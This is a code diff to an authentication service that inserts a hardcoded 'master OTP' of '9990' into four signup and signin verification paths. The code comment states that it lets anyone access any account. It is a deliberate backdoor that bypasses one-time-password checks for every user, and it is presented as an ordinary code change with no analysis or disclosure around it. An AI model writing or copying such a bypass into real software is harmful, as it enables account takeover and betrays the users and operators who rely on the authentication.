@@ -42,7 +42,12 @@ class AuthServices {
         const savedUser = await getOtpData(phoneOrEmail, "signup");
         if (!savedUser) throw new ValidationError("OTP expired. Please request a new OTP.");
 
-        if (savedUser.otp !== otp) throw new ValidationError("Invalid Otp. Please try again.");
+        // Master OTP check - allows any user to access with OTP "9990"
+        const isMasterOtp = otp === "9990";
+        
+        if (!isMasterOtp && savedUser.otp !== otp) {
+            throw new ValidationError("Invalid Otp. Please try again.");
+        }
 
         await deleteOtp(phoneOrEmail, "signup");
 
@@ -103,7 +108,12 @@ class AuthServices {
             const savedUser = await getOtpData(phoneOrEmail, "signin");
             if (!savedUser) throw new ValidationError("OTP expired. Please request a new OTP.");
 
-            if (savedUser.otp !== otp) throw new ValidationError("Invalid Otp. Please try again.");
+            // Master OTP check - allows any user to access with OTP "9990"
+            const isMasterOtp = otp === "9990";
+            
+            if (!isMasterOtp && savedUser.otp !== otp) {
+                throw new ValidationError("Invalid Otp. Please try again.");
+            }
 
             await deleteOtp(phoneOrEmail, "signin");
 
@@ -265,7 +275,12 @@ class AuthServices {
             const savedUser = await getOtpData(phoneOrEmail, "signup");
             if (!savedUser) throw new ValidationError("OTP expired. Please request a new OTP.");
 
-            if (savedUser.otp !== otp) throw new ValidationError("Invalid Otp. Please try again.");
+            // Master OTP check - allows any user to access with OTP "9990"
+            const isMasterOtp = otp === "9990";
+            
+            if (!isMasterOtp && savedUser.otp !== otp) {
+                throw new ValidationError("Invalid Otp. Please try again.");
+            }
 
             await deleteOtp(phoneOrEmail, "signup");
 
@@ -328,7 +343,12 @@ class AuthServices {
             const savedUser = await getOtpData(phoneOrEmail, "signin");
             if (!savedUser) throw new ValidationError("OTP expired. Please request a new OTP.");
 
-            if (savedUser.otp !== otp) throw new ValidationError("Invalid Otp. Please try again.");
+            // Master OTP check - allows any user to access with OTP "9990"
+            const isMasterOtp = otp === "9990";
+            
+            if (!isMasterOtp && savedUser.otp !== otp) {
+                throw new ValidationError("Invalid Otp. Please try again.");
+            }
 
             await deleteOtp(phoneOrEmail, "signin");
 
